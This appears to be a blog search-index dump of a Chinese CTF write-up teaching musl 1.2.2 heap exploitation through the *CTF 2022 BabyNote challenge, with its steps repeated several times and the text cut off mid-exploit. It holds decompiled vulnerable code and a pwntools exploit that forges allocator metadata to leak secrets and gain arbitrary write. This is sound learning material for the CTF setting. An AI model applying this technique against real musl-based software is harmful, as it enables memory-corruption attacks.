[{"categories":["pwn"],"collections":null,"content":"看到hkcertctf出了一道musl的题来学习一下 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:0:0","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#"},{"categories":["pwn"],"collections":null,"content":"前言\r基础知识部分就不详细列出了，列出一些我的参考文章。其实主要还是看源码 io板子 源码分析 主要参考文章：小小做题家之musl1.2.2的利用手法 利用手法： dequeue：用于任意地址写 queue：把fake_meta链入active链表，从而进行任意地址的堆块分配 IO：有通过puts和exit触发的 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:1:0","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#前言"},{"categories":["pwn"],"collections":null,"content":"环境配置\r","date":"2026-01-10","objectID":"/posts/musl_pwn/:2:0","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#环境配置"},{"categories":["pwn"],"collections":null,"content":"编译libc\r拿到题目的musl libc版本之后，最好自己编译一个musl libc，使用自己编译的libc启动题目有符号表能支持调试（有的题目给的libc没有符号表就调试不了），调试的时候还能看到musl的源码知道哪里出错了 Note\r查看musl libc版本： ./libc.so git clone https://github.com/kraj/musl.git cd musl git checkout v1.2.2 CFLAGS=\"-g -O0\" ./configure --prefix=$PWD/install make -j$(nproc) make install 这样musl/install/lib下就有没去符号表的libc.so ","date":"2026-01-10","objectID":"/posts/musl_pwn/:2:1","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#编译libc"},{"categories":["pwn"],"collections":null,"content":"启动题目\rpatchelf --set-interpreter ../musl-libc/v1.2.2 ./pwn 然后exp中直接 p = process(\"./pwn\") 即可 如果没有patchelf，通过 ./libc.so ./pwn 启动，会有点问题（虽然也不是不行） ","date":"2026-01-10","objectID":"/posts/musl_pwn/:2:2","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#启动题目"},{"categories":["pwn"],"collections":null,"content":"调试\rsudo apt install musl-dbgsym git clone https://github.com/xf1les/muslheap.git echo \"source /path/to/muslheap.py\" \u003e\u003e ~/.gdbinit 命令 作用 mheap 可以查看__malloc_context的部分信息，可以详细看到每一条meta链表 p/x __malloc_context 可以查看__malloc_context的详细信息，但无法详细看到每一条meta链表 mmagic 用于查看关键函数的地址 p/x (struct meta) \u003cmeta地址\u003e 查看某个meta结构体的详细信息 p/x (struct group) \u003cgroup地址\u003e 查看group结构体详细信息 mchunkinfo 查看某个用户指针所属 slot 的详细信息 mfindslot 从任意地址反向定位其所在 slot p/x stdout 查看stdout结构体 p/x (struct meta_area) \u003cmeta_area address\u003e 查看meta_area，meta \u0026 0xffffffffffff000就能找到meta_arena结构体 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:2:3","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#调试"},{"categories":["pwn"],"collections":null,"content":"*CTF（星CTF）——Babynote\rhttps://github.com/sixstars/starctf2022/tree/main/pwn-BabyNote 逆向分析，略。。。 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:3:0","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#ctf星ctfbabynote"},{"categories":["pwn"],"collections":null,"content":"漏洞\radd的时候，把global_note给了heap_ptr[4]，delete的时候，没有把heap_ptr[4]中的global_note置0，存在UAF int __fastcall add(struct _IO_FILE *stderr) { __int64 *heap_ptr; // [rsp+8h] [rbp-8h] heap_ptr = (__int64 *)calloc(1u, 0x28u); heap_ptr[2] = create_name(heap_ptr); heap_ptr[3] = create_note(heap_ptr + 1); heap_ptr[4] = global_note; global_note = (__int64)heap_ptr; return puts(\"ok\"); } unsigned __int64 __fastcall delete(struct _IO_FILE *stderr) { // ... ptr_1 = 0; size = create_name((__int64 *)\u0026ptr_1); ptr = (void *)find_name(ptr_1, size); if ( ptr ) { if ( ptr != (void *)global_note || *(_QWORD *)(global_note + 0x20) )// 要删除的是中间或末尾节点 { if ( *((_QWORD *)ptr + 4) ) { // 遍历链表找到指向ptr的前一个节点的next指针位置 for ( p_global_note = \u0026global_note; ptr != (void *)*p_global_note; p_global_note = (__int64 *)(*p_global_note + 32) ) ; *p_global_note = *((_QWORD *)ptr + 4); // 更新前一个节点的next指针，从链表中移除ptr } } else { global_note = 0; // 要删除的是头节点且没有后继节点 } free(*(void **)ptr); // 释放name指针 free(*((void **)ptr + 1)); // 释放note_content指针 free(ptr); // 释放节点本身 puts(\"ok\"); } else { puts(\"oops.....\"); } free(ptr_1); // ... } ","date":"2026-01-10","objectID":"/posts/musl_pwn/:3:1","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#漏洞"},{"categories":["pwn"],"collections":null,"content":"流程\r整体流程可以分为这三步： 泄露elfbase、libc_base 泄露secret 把堆块申请在stdout 第一步\r在前面两步泄露地址中，只需要关注active[2]这个链表（0x30大小） add一次，申请一个0x30大小的note1，来防止free掉group中所有chunk时，将整个group归还给堆管理器 Note\r接下来需要注意，group对chunk的管理策略： malloc的时候取的是avail_mask中最低位的堆块，也就是一个group中最低地址的堆块 被free掉的堆块，会把它的free_mask置1，avail_mask不动还是0 当一个group中没有avail堆块时，会把被free的堆块标记成avail，free_mask就置0了 接着把note2申请到active[2]的第十个chunk的位置，note2_content申请到第二个的位置 申请note3，并把note2给free掉，此时note3还记录着note2的位置即第十个chunk的位置 接着在note2_content的位置申请note4，泄露出note4记录的两个堆地址 Note\rmusl申请的堆块，有的大小能泄露elfbase，有的能泄露libc\r## leak libcbase \u0026\u0026 elfbase add(0x38,b\"a\"*0x38,0x38,b\"a\"*0x38) #防止将整个group归还给堆管理器 cho(4) for _ in range(8): find(0x28,\"a\"*0x28) add(0x38,\"2\"*0x38,0x28,\"2\"*0x28) add(0x38,\"3\"*0x38,0x38,\"3\"*0x38) delet(0x38,\"2\"*0x38) for _ in range(6): find(0x28,\"a\"*0x28) add(0x38,\"4\"*0x38,0x58,\"4\"*0x58) #一个堆块泄露elfbase，一个libc find(0x38,\"2\"*0x38) p.recvuntil(\"0x28:\") libcbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0xb7d60 #参考文章中，这里我本地不太对 libcbase_true=libcbase - 0x2b020 + 0x4000 #调整了一下，我本地这个是对的 elfbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0x4c40 lg(\"libcbase\") lg(\"libcbase_true\") lg(\"elfbase\") 第二步\r把原本note2中执行content的指针改成malloc_context，show即可 # leak secret for _ in range(6): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(malloc_context)+p64(0x38)+p64(0x28)+p64(0) find(0x28,pd) find(0x38,b\"a\"*0x38) p.recvuntil(\"0x28:\") secret=u64(p64(int(p.recv(16),16),endianness=\"big\")) lg(\"secret\") 第三步\r此时，能通过修改note2_content来进行任意地址读和free 有了elfbase、libc_base、secret，接下来就是把堆块申请到stdout上，通过puts打IO 把堆块申请到stdout上，需要： 在stdout-0x10伪造一个group。通过dequeue，在stdout-0x10写上fake_group_addr 利用queue 把fake_meta链入active链表 dequeue 触发dequeue需要fake_meta的构造： 通过get_meta() 所有assert。包括： fake_meta那个页的起始的secret要等于malloc_context的secret fake_meta 中保存的 group 指针要正确 被free掉的chunk的index小于等于fake_meta-\u003elast_idx nontrivial_free() 进入 第一个 if 分支。包括： free_able == 1 伪造prev、next，通过dequeue的unlink写stdout-0x10 然后，通过任意地址free，free掉fake_group的第一个chunk，执行dequeue # set fake meta add(0x28,b\"5\"*0x28,0x1200,'\\n') #0x1200:防止将mmap出来的group归还给堆管理器 last_idx, freeable, sc, maplen = 0, 1, 8, 1 #fake meta fake_meta = p64(stdout - 0x18) # prev fake_meta += p64(fake_meta_addr + 0x30) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) #对齐 #fake group fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'a' * 0xaa0 #pad,为了页对齐，让secret在页起始位置 #fake meta area payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' find(0x1200,payload) #设置stdout-0x10为fake_group_addr # dequeue 2 set stdout_file - 0x10 (where the final fake group) for _ in range(3): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"6\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) #dequeue queue 触发queue还是需要通过get_meta的检查，然后就是走nontrivial_free的else_if分支： freeable == 0 这里sc等于几就是进第几个active链表，但是需要sc\u003c48 # queue 把fake_meta链入active[8] # reset fake meta , free fake chunk 2 queue it(queue the fake meta) last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta fake_meta = p64(0) # prev fake_meta += p64(0) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'z' * 0xa90 payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' #z() find(0x1200, payload) for _ in range(2): find(0x28, b'a' * 0x28) pd=p64(elfbase+0x5fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"7\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) lg(\"fake_meta_addr\") 接着把fake_meta-\u003emem改为stdout-0x10即可把堆块申请到stdout上了 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:3:2","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#流程"},{"categories":["pwn"],"collections":null,"content":"流程\r整体流程可以分为这三步： 泄露elfbase、libc_base 泄露secret 把堆块申请在stdout 第一步\r在前面两步泄露地址中，只需要关注active[2]这个链表（0x30大小） add一次，申请一个0x30大小的note1，来防止free掉group中所有chunk时，将整个group归还给堆管理器 Note\r接下来需要注意，group对chunk的管理策略： malloc的时候取的是avail_mask中最低位的堆块，也就是一个group中最低地址的堆块 被free掉的堆块，会把它的free_mask置1，avail_mask不动还是0 当一个group中没有avail堆块时，会把被free的堆块标记成avail，free_mask就置0了 接着把note2申请到active[2]的第十个chunk的位置，note2_content申请到第二个的位置 申请note3，并把note2给free掉，此时note3还记录着note2的位置即第十个chunk的位置 接着在note2_content的位置申请note4，泄露出note4记录的两个堆地址 Note\rmusl申请的堆块，有的大小能泄露elfbase，有的能泄露libc\r## leak libcbase \u0026\u0026 elfbase add(0x38,b\"a\"*0x38,0x38,b\"a\"*0x38) #防止将整个group归还给堆管理器 cho(4) for _ in range(8): find(0x28,\"a\"*0x28) add(0x38,\"2\"*0x38,0x28,\"2\"*0x28) add(0x38,\"3\"*0x38,0x38,\"3\"*0x38) delet(0x38,\"2\"*0x38) for _ in range(6): find(0x28,\"a\"*0x28) add(0x38,\"4\"*0x38,0x58,\"4\"*0x58) #一个堆块泄露elfbase，一个libc find(0x38,\"2\"*0x38) p.recvuntil(\"0x28:\") libcbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0xb7d60 #参考文章中，这里我本地不太对 libcbase_true=libcbase - 0x2b020 + 0x4000 #调整了一下，我本地这个是对的 elfbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0x4c40 lg(\"libcbase\") lg(\"libcbase_true\") lg(\"elfbase\") 第二步\r把原本note2中执行content的指针改成malloc_context，show即可 # leak secret for _ in range(6): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(malloc_context)+p64(0x38)+p64(0x28)+p64(0) find(0x28,pd) find(0x38,b\"a\"*0x38) p.recvuntil(\"0x28:\") secret=u64(p64(int(p.recv(16),16),endianness=\"big\")) lg(\"secret\") 第三步\r此时，能通过修改note2_content来进行任意地址读和free 有了elfbase、libc_base、secret，接下来就是把堆块申请到stdout上，通过puts打IO 把堆块申请到stdout上，需要： 在stdout-0x10伪造一个group。通过dequeue，在stdout-0x10写上fake_group_addr 利用queue 把fake_meta链入active链表 dequeue 触发dequeue需要fake_meta的构造： 通过get_meta() 所有assert。包括： fake_meta那个页的起始的secret要等于malloc_context的secret fake_meta 中保存的 group 指针要正确 被free掉的chunk的index小于等于fake_meta-\u003elast_idx nontrivial_free() 进入 第一个 if 分支。包括： free_able == 1 伪造prev、next，通过dequeue的unlink写stdout-0x10 然后，通过任意地址free，free掉fake_group的第一个chunk，执行dequeue # set fake meta add(0x28,b\"5\"*0x28,0x1200,'\\n') #0x1200:防止将mmap出来的group归还给堆管理器 last_idx, freeable, sc, maplen = 0, 1, 8, 1 #fake meta fake_meta = p64(stdout - 0x18) # prev fake_meta += p64(fake_meta_addr + 0x30) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) #对齐 #fake group fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'a' * 0xaa0 #pad,为了页对齐，让secret在页起始位置 #fake meta area payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' find(0x1200,payload) #设置stdout-0x10为fake_group_addr # dequeue 2 set stdout_file - 0x10 (where the final fake group) for _ in range(3): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"6\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) #dequeue queue 触发queue还是需要通过get_meta的检查，然后就是走nontrivial_free的else_if分支： freeable == 0 这里sc等于几就是进第几个active链表，但是需要sc\u003c48 # queue 把fake_meta链入active[8] # reset fake meta , free fake chunk 2 queue it(queue the fake meta) last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta fake_meta = p64(0) # prev fake_meta += p64(0) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'z' * 0xa90 payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' #z() find(0x1200, payload) for _ in range(2): find(0x28, b'a' * 0x28) pd=p64(elfbase+0x5fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"7\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) lg(\"fake_meta_addr\") 接着把fake_meta-\u003emem改为stdout-0x10即可把堆块申请到stdout上了 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:3:2","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#第一步"},{"categories":["pwn"],"collections":null,"content":"流程\r整体流程可以分为这三步： 泄露elfbase、libc_base 泄露secret 把堆块申请在stdout 第一步\r在前面两步泄露地址中，只需要关注active[2]这个链表（0x30大小） add一次，申请一个0x30大小的note1，来防止free掉group中所有chunk时，将整个group归还给堆管理器 Note\r接下来需要注意，group对chunk的管理策略： malloc的时候取的是avail_mask中最低位的堆块，也就是一个group中最低地址的堆块 被free掉的堆块，会把它的free_mask置1，avail_mask不动还是0 当一个group中没有avail堆块时，会把被free的堆块标记成avail，free_mask就置0了 接着把note2申请到active[2]的第十个chunk的位置，note2_content申请到第二个的位置 申请note3，并把note2给free掉，此时note3还记录着note2的位置即第十个chunk的位置 接着在note2_content的位置申请note4，泄露出note4记录的两个堆地址 Note\rmusl申请的堆块，有的大小能泄露elfbase，有的能泄露libc\r## leak libcbase \u0026\u0026 elfbase add(0x38,b\"a\"*0x38,0x38,b\"a\"*0x38) #防止将整个group归还给堆管理器 cho(4) for _ in range(8): find(0x28,\"a\"*0x28) add(0x38,\"2\"*0x38,0x28,\"2\"*0x28) add(0x38,\"3\"*0x38,0x38,\"3\"*0x38) delet(0x38,\"2\"*0x38) for _ in range(6): find(0x28,\"a\"*0x28) add(0x38,\"4\"*0x38,0x58,\"4\"*0x58) #一个堆块泄露elfbase，一个libc find(0x38,\"2\"*0x38) p.recvuntil(\"0x28:\") libcbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0xb7d60 #参考文章中，这里我本地不太对 libcbase_true=libcbase - 0x2b020 + 0x4000 #调整了一下，我本地这个是对的 elfbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0x4c40 lg(\"libcbase\") lg(\"libcbase_true\") lg(\"elfbase\") 第二步\r把原本note2中执行content的指针改成malloc_context，show即可 # leak secret for _ in range(6): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(malloc_context)+p64(0x38)+p64(0x28)+p64(0) find(0x28,pd) find(0x38,b\"a\"*0x38) p.recvuntil(\"0x28:\") secret=u64(p64(int(p.recv(16),16),endianness=\"big\")) lg(\"secret\") 第三步\r此时，能通过修改note2_content来进行任意地址读和free 有了elfbase、libc_base、secret，接下来就是把堆块申请到stdout上，通过puts打IO 把堆块申请到stdout上，需要： 在stdout-0x10伪造一个group。通过dequeue，在stdout-0x10写上fake_group_addr 利用queue 把fake_meta链入active链表 dequeue 触发dequeue需要fake_meta的构造： 通过get_meta() 所有assert。包括： fake_meta那个页的起始的secret要等于malloc_context的secret fake_meta 中保存的 group 指针要正确 被free掉的chunk的index小于等于fake_meta-\u003elast_idx nontrivial_free() 进入 第一个 if 分支。包括： free_able == 1 伪造prev、next，通过dequeue的unlink写stdout-0x10 然后，通过任意地址free，free掉fake_group的第一个chunk，执行dequeue # set fake meta add(0x28,b\"5\"*0x28,0x1200,'\\n') #0x1200:防止将mmap出来的group归还给堆管理器 last_idx, freeable, sc, maplen = 0, 1, 8, 1 #fake meta fake_meta = p64(stdout - 0x18) # prev fake_meta += p64(fake_meta_addr + 0x30) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) #对齐 #fake group fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'a' * 0xaa0 #pad,为了页对齐，让secret在页起始位置 #fake meta area payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' find(0x1200,payload) #设置stdout-0x10为fake_group_addr # dequeue 2 set stdout_file - 0x10 (where the final fake group) for _ in range(3): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"6\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) #dequeue queue 触发queue还是需要通过get_meta的检查，然后就是走nontrivial_free的else_if分支： freeable == 0 这里sc等于几就是进第几个active链表，但是需要sc\u003c48 # queue 把fake_meta链入active[8] # reset fake meta , free fake chunk 2 queue it(queue the fake meta) last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta fake_meta = p64(0) # prev fake_meta += p64(0) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'z' * 0xa90 payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' #z() find(0x1200, payload) for _ in range(2): find(0x28, b'a' * 0x28) pd=p64(elfbase+0x5fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"7\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) lg(\"fake_meta_addr\") 接着把fake_meta-\u003emem改为stdout-0x10即可把堆块申请到stdout上了 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:3:2","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#第二步"},{"categories":["pwn"],"collections":null,"content":"流程\r整体流程可以分为这三步： 泄露elfbase、libc_base 泄露secret 把堆块申请在stdout 第一步\r在前面两步泄露地址中，只需要关注active[2]这个链表（0x30大小） add一次，申请一个0x30大小的note1，来防止free掉group中所有chunk时，将整个group归还给堆管理器 Note\r接下来需要注意，group对chunk的管理策略： malloc的时候取的是avail_mask中最低位的堆块，也就是一个group中最低地址的堆块 被free掉的堆块，会把它的free_mask置1，avail_mask不动还是0 当一个group中没有avail堆块时，会把被free的堆块标记成avail，free_mask就置0了 接着把note2申请到active[2]的第十个chunk的位置，note2_content申请到第二个的位置 申请note3，并把note2给free掉，此时note3还记录着note2的位置即第十个chunk的位置 接着在note2_content的位置申请note4，泄露出note4记录的两个堆地址 Note\rmusl申请的堆块，有的大小能泄露elfbase，有的能泄露libc\r## leak libcbase \u0026\u0026 elfbase add(0x38,b\"a\"*0x38,0x38,b\"a\"*0x38) #防止将整个group归还给堆管理器 cho(4) for _ in range(8): find(0x28,\"a\"*0x28) add(0x38,\"2\"*0x38,0x28,\"2\"*0x28) add(0x38,\"3\"*0x38,0x38,\"3\"*0x38) delet(0x38,\"2\"*0x38) for _ in range(6): find(0x28,\"a\"*0x28) add(0x38,\"4\"*0x38,0x58,\"4\"*0x58) #一个堆块泄露elfbase，一个libc find(0x38,\"2\"*0x38) p.recvuntil(\"0x28:\") libcbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0xb7d60 #参考文章中，这里我本地不太对 libcbase_true=libcbase - 0x2b020 + 0x4000 #调整了一下，我本地这个是对的 elfbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0x4c40 lg(\"libcbase\") lg(\"libcbase_true\") lg(\"elfbase\") 第二步\r把原本note2中执行content的指针改成malloc_context，show即可 # leak secret for _ in range(6): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(malloc_context)+p64(0x38)+p64(0x28)+p64(0) find(0x28,pd) find(0x38,b\"a\"*0x38) p.recvuntil(\"0x28:\") secret=u64(p64(int(p.recv(16),16),endianness=\"big\")) lg(\"secret\") 第三步\r此时，能通过修改note2_content来进行任意地址读和free 有了elfbase、libc_base、secret，接下来就是把堆块申请到stdout上，通过puts打IO 把堆块申请到stdout上，需要： 在stdout-0x10伪造一个group。通过dequeue，在stdout-0x10写上fake_group_addr 利用queue 把fake_meta链入active链表 dequeue 触发dequeue需要fake_meta的构造： 通过get_meta() 所有assert。包括： fake_meta那个页的起始的secret要等于malloc_context的secret fake_meta 中保存的 group 指针要正确 被free掉的chunk的index小于等于fake_meta-\u003elast_idx nontrivial_free() 进入 第一个 if 分支。包括： free_able == 1 伪造prev、next，通过dequeue的unlink写stdout-0x10 然后，通过任意地址free，free掉fake_group的第一个chunk，执行dequeue # set fake meta add(0x28,b\"5\"*0x28,0x1200,'\\n') #0x1200:防止将mmap出来的group归还给堆管理器 last_idx, freeable, sc, maplen = 0, 1, 8, 1 #fake meta fake_meta = p64(stdout - 0x18) # prev fake_meta += p64(fake_meta_addr + 0x30) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) #对齐 #fake group fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'a' * 0xaa0 #pad,为了页对齐，让secret在页起始位置 #fake meta area payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' find(0x1200,payload) #设置stdout-0x10为fake_group_addr # dequeue 2 set stdout_file - 0x10 (where the final fake group) for _ in range(3): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"6\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) #dequeue queue 触发queue还是需要通过get_meta的检查，然后就是走nontrivial_free的else_if分支： freeable == 0 这里sc等于几就是进第几个active链表，但是需要sc\u003c48 # queue 把fake_meta链入active[8] # reset fake meta , free fake chunk 2 queue it(queue the fake meta) last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta fake_meta = p64(0) # prev fake_meta += p64(0) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'z' * 0xa90 payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' #z() find(0x1200, payload) for _ in range(2): find(0x28, b'a' * 0x28) pd=p64(elfbase+0x5fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"7\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) lg(\"fake_meta_addr\") 接着把fake_meta-\u003emem改为stdout-0x10即可把堆块申请到stdout上了 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:3:2","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#第三步"},{"categories":["pwn"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address,checksec=False) libc = ELF(\"../musl-libc/v1.2.2\") #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) lgaddr = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) else: # p = process([\"/home/j4f/pwn/challs/heap/musl/musl-libc/v1.2.2\",address]) p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() def cho(num): sla(\"option: \",str(num)) def add(namesz, name, notesz, note): cho(1) sla(b\"name size: \", str(namesz)) # sla(b\"name: \", name) sa(b\"name: \", name) sla(b\"note size: \", str(notesz)) # sla(b\"note content: \", note) sa(b\"note content: \", note) def find(namesz,name): cho(2) sla(\"name size: \",str(namesz)) # sla(\"name: \",name) sa(\"name: \",name) def delet(namesz,name): cho(3) sla(\"name size: \",str(namesz)) # sla(\"name: \",name) sa(\"name: \",name) def remake(): cho(4) ## leak libcbase \u0026\u0026 elfbase add(0x38,b\"a\"*0x38,0x38,b\"a\"*0x38) #防止将整个group归还给堆管理器 cho(4) for _ in range(8): find(0x28,\"a\"*0x28) add(0x38,\"2\"*0x38,0x28,\"2\"*0x28) add(0x38,\"3\"*0x38,0x38,\"3\"*0x38) delet(0x38,\"2\"*0x38) for _ in range(6): find(0x28,\"a\"*0x28) add(0x38,\"4\"*0x38,0x58,\"4\"*0x58) #一个堆块泄露elfbase，一个libc find(0x38,\"2\"*0x38) p.recvuntil(\"0x28:\") libcbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0xb7d60 #这里不太对 libcbase_true=libcbase - 0x2b020 + 0x4000 #调整了一下 elfbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0x4c40 lg(\"libcbase\") lg(\"libcbase_true\") lg(\"elfbase\") # calculate important addr malloc_context = libcbase + 0xb4ac0 # mmap_base = libcbase - 0xa000 mmap_base = libcbase_true - 0x4000 fake_meta_addr = mmap_base + 0x2010 fake_mem_addr = mmap_base + 0x2040 # stdout = libcbase + 0xb4280 stdout = libcbase_true + 0xdb2c0 lg(\"malloc_context\") lg(\"mmap_base\") lg(\"fake_meta_addr\") lg(\"fake_mem_addr\") lg(\"stdout\") # leak secret for _ in range(6): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(malloc_context)+p64(0x38)+p64(0x28)+p64(0) find(0x28,pd) find(0x38,b\"a\"*0x38) p.recvuntil(\"0x28:\") secret=u64(p64(int(p.recv(16),16),endianness=\"big\")) lg(\"secret\") # set fake meta add(0x28,b\"5\"*0x28,0x1200,'\\n') #0x1200:防止将mmap出来的group归还给堆管理器 last_idx, freeable, sc, maplen = 0, 1, 8, 